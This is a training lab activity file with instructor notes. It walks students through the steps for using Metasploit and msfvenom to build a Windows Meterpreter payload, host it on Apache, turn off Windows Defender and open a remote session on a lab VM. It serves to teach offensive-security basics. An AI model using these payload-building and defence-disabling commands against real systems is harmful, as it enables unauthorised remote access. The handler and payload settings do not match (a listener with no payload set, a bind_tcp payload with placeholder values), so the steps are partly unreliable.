## Activity File: Metasploit
In this activity, you will use Metasploit and MSFvenom to open a shell on your Windows VM.

### Instructions 

1. Login to the Kali machine with credentials `root/toor`

2. Click on the Metasploit icon on the taskbar

Explain to students that unlike most C2 frameworks, Metasploit is purely commandline based and has no web application or GUI. 

3. Once metasploit is started, type `use exploit/multi/handler` 

Explain to students that in order for the payload/agent we're going to craft to communicate back to Metasploit, we need to start something called a 'listener' that "listens" for the payload to talk back.

- Without starting a listener, the C2 server will not be able to communicate with any agents.

- Metasploit works through its use of "modules". In this case, we're using the `exploit/multi/handler` module which is Metasploit's listener module.

4. Type `ip addr` to get the IP address of the Kali machine, then type `set LHOST <kali ip address>`

5. After the LHOST (listener host) is set, set the LPORT by typing `set LPORT 4444`

![](/Images/01.Metasploitoptions.PNG)

6. Once LPORT and LHOST is set, start the listener by typing `run -j`. The `-j` option sets it to run in background.

7. Next, generate the agent/payload by typing `msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe` 

![](/Images/02.Metasploitmsfvenom.PNG)

8. Clear out the /var/www/html/ folder: `rm /var/www/html/*`

9. Move the payload to /var/www/html: `mv shell.exe /var/www/html/`

10. Start the apache web service by typing `service apache2 start`

![](/Images/03.apache.PNG)

11. Now move from your Kali VM to your Windows VM. Open an web browser and browse to your Kali's IP address. Download the `shell.exe` payload and execute it.

- Note: Windows Defender should be turned off. If not turned off, open PowerShell as administrator and run `Set-MPPreference -DisableRealTimeMonitoring $true` 

![](/Images/04.Windows.PNG)

12. Back in Kali, you should see a message "Meterpreter Session 1 opened". To interact with this session, type `sessions -i 1`

![](/Images/05.Session.PNG)

13. You now have a shell into the Windows machine, with Metasploit operating as the C2 server. Gather the IP address of the Windows machine by typing `ipconfig`
